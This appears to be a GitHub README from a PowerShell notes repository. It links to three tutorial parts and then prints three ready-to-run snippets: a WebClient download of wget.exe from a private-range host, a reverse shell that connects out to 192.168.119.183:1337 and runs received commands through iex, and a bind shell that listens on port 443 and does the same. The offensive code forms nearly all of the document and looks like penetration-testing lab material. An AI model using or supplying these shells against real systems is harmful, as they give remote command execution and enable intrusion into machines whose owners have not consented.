# PowerShell

![powershell-icon-4](https://user-images.githubusercontent.com/92652606/140179580-4de847c5-d5a5-4e05-8924-4cb36c060225.png)

1. [PowerShell Part 1](https://github.com/Th3Mast3rM1nd/PowerShell/blob/main/Powershell_Part1.md)
2. [PowerShell Part 2](https://github.com/Th3Mast3rM1nd/PowerShell/blob/main/Powershell_Part2.md)
3. [Powershell Part 3](https://github.com/Th3Mast3rM1nd/PowerShell/blob/main/Powershell_Part3.md)

```powershell
Write-Output "Download Files"

$url = "http://192.168.119.183:8080/wget.exe"
$path = ".\wget.exe"

(New-Object System.Net.WebClient).DownloadFile($url,$path) # script to download files 

```
```powershell
# reversshell
$client = New-Object System.Net.Sockets.TCPClient('192.168.119.183',1337);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush();
    }
$client.Close()

```

```powershell
# blind shell
$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0' , 443 );
$listener.start();
$client = $listener.AcceptTcpClient();
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush();
    }
$client.Close();
$listener.Stop()
```
